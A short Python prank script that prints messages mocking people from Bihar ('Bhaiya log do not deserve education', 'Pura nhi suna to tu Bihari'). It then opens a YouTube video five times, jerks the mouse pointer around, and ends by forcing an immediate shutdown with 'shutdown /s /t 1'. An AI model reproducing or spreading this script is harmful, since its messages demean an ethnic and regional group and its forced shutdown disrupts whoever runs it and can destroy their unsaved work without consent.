import os
import webbrowser as wb 
import time
import pyautogui as pw
import random

BHAIYA_SONG = "https://www.youtube.com/watch?v=Ezo-CO6iWiY"

def main():
    print("\n\n\t\t\t\tBhaiya log do not deserve education...\n\n")
    time.sleep(5)
    print("Proof of which is as follows...\n\n")
    time.sleep(3)
    print("Starting in...\n")
    time.sleep(1.5)
    print(f'3..\n')
    time.sleep(1.5)
    print(f'2..\n')
    time.sleep(1.5)
    print(f'1..')
    time.sleep(1.5)
    print("\nPura nhi suna to tu Bihari...")
    time.sleep(3)

    for _ in range(5):
        wb.open(BHAIYA_SONG)
        random_x = random.randint(200, 1000)
        random_y = random.randint(200, 1000)
        pw.moveTo(random_x, random_y)
        time.sleep(1)



    os.system("shutdown /s /t 1")
    
main() 
